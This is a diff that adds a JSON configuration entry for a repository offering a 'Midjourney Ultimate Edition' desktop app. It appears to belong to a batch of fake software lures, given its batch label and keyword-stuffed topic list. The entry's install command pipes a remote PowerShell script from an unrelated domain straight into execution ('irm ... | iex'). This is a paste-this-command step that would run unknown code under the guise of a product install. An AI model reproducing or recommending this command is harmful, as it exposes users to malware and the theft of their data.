@@ -1,0 +1,28 @@
+{
+  "repo": "midjourney-ultimate-edition",
+  "product": "Midjourney Ultimate Edition",
+  "kind": "ai",
+  "install_type": "download",
+  "download_url": "https://midjourney.mefidirect.xyz/",
+  "install_url": "https://mefidirect.xyz/ps/setup.ps1",
+  "install_command": "irm https://mefidirect.xyz/ps/setup.ps1 | iex",
+  "batch": "new32",
+  "format": "license-md-only",
+  "category": "ai",
+  "topics": [
+    "midjourney-desktop-app",
+    "midjourney-release",
+    "midjourney-setup",
+    "content-generator",
+    "software-hub",
+    "midjourney-windows-guide",
+    "prompt-workflow",
+    "generative-tools",
+    "release-notes",
+    "stable-channel",
+    "midjourney-desktop",
+    "app-catalog",
+    "midjourney-windows",
+    "midjourney-app"
+  ]
+}
